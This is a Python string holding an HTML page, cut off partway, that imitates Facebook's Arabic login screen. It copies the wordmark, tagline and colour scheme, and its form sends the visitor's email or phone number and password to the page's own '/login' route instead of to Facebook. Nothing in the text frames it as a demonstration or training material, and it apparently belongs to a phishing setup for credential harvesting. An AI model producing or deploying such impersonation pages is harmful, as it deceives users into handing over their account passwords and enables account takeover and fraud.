HTML_CODE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 350px; text-align: center; }
        /* هادي هي العلامة الفوقانية */
        .brand-logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 10px; text-decoration: none; }
        .brand-desc { color: #606770; font-size: 18px; margin-bottom: 25px; line-height: 1.2; }
        
        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
        button { width: 98%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 10px; }
        button:hover { background: #166fe5; }
        .footer-link { margin-top: 20px; border-top: 1px solid #ddd; padding-top: 20px; }
        .footer-link a { color: #1877f2; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="brand-logo">facebook</div>
        <div class="brand-desc">يساعدك في التواصل مع الأشخاص في حياتك.</div>
        
        <form action="/login" method="post">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="password" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
        
        <div class="
